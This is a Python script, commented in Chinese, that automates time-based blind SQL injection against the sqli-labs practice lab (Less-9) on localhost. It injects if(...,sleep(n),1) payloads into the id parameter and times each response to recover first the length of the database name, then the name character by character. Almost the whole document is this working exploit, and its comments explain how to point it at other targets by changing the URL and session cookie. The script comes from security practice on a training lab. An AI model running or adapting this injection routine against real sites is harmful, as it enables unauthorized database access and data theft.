#时间盲注
#该脚本只爆破数据库长度和数据库名
#该脚本的使用需要配置两个函数中的url(这里的url包括了目标的地址以及后面的参数)，
# 遍历字符串集，header中的cookie（浏览器使用f12查看，或者查看数据包）

#这里是post请求格式，如果是post请求可以根据该格式修改
#url = "http://httpbin.org/post"
# data = {'key1': 'value1', 'key2': 'value2'}
# response = requests.post(url, data=data)
# print(response.text)

import time
import requests,string

#时间盲注得到数据库长度
def get_database_lenth():
    #需要配置的地方：要遍历的字符串集，url，header中的cookie，
    #要遍历的字符串集，这里遍历的是长度，可以根据实际情况修改
    length=range(1,50)
    for len in length:
        start = time.time()
        #查看浏览器登陆后的cookie，加入到请求头中
        header={"cookie":"PHPSESSID=91d4b17ea311dc675456414da6798594"}
        url=f"http://localhost/sqli-labs-master/Less-9?id=1' and if(length(database())={len},sleep(5),1)--+"
        resp = requests.get(url=url) #,headers=header
        end = time.time()
        resptime = end-start
        if int(resptime) >=3:      #判断条件也要根据情况定，这里sleep(3)所以大于等于三就是注入成功，要根据网速以及其他情况定
            print("盲注成功，数据库长度为",len)
            return len

#时间盲注得到数据库名
def get_database_name(length):
    database=""
    position=1
    #包含所有小写字母，数字以及后面的符号的字符串集
    charset = string.ascii_letters + string.digits + "_$-@."
    # for len in range(1,length):

    while True:
        for char in charset:
            start = time.time()
            header = {"cookie": "PHPSESSID=91d4b17ea311dc675456414da6798594"}
            url = f"http://localhost/sqli-labs-master/Less-9?id=1' and if(substr(database(),{position},1)='{char}',sleep(3),1)--+"
            resp = requests.get(url=url) #, headers=header
            end = time.time()
            resptime = end - start
            if int(resptime) >=3:      #判断条件也要根据情况定，这里sleep(3)所以大于等于三就是注入成功，要根据网速以及其他情况定
                database+=char
                position+=1
            if position > length:
                return database

if __name__ == '__main__':
    # try:
        database=get_database_name(get_database_lenth())
        print(f'盲注成功,数据库名字为{database}')
    # except:
    #     pass